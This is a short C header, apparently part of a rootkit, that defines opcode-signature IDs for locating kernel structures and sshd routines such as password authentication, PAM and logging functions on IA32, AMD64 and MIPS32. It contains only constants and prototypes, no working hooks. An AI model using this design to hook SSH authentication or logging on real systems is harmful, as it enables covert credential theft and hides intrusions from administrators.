#ifndef __OPSIG_H
#define __OPSIG_H

#include <arch.h>

#define OPSIG_DBG   0x666

#define KERN_OPSIG      0
#define SSH_OPSIG       1

#define DENTRY_INODE    0
#define SK_BUFF_PROT    1
#define SK_BUFF_NOFF    2
#define SK_BUFF_HOFF    3

#define SSH_MAIN        0
#define SSH_REXEC       1
#define SSH_AUTHPWD     2
#define SSH_DO_LOG      3
#define SSH_LOGIT       4
#define SSH_PAM         5
#define SSH_PAM_PRO     6

#ifdef __IA32__
#define KERN_OPS        3
#define SSH_OPS         7
#define DREGX(x)        1
#define SREGX(x)        1
#endif

#ifdef __AMD64__
#define KERN_OPS        4
#define SSH_OPS         7
#define DREGX(x)        1
#define SREGX(x)        1
#endif

#ifdef __MIPS32__
#define LUI_GP          3
#define LW_GP           4
#define LW_GP_SP        5
#define SW_GP_SP        6
#define JALR_SCT        7
#define KERN_OPS        8
#endif

struct opref {
	unsigned long offset;
	unsigned char *addr;
	unsigned char *opaddr;
	unsigned char *end;
	unsigned int nb_max;
};

unsigned long rkopsig(struct opref *, int);
void rkregopsig(int);

#endif
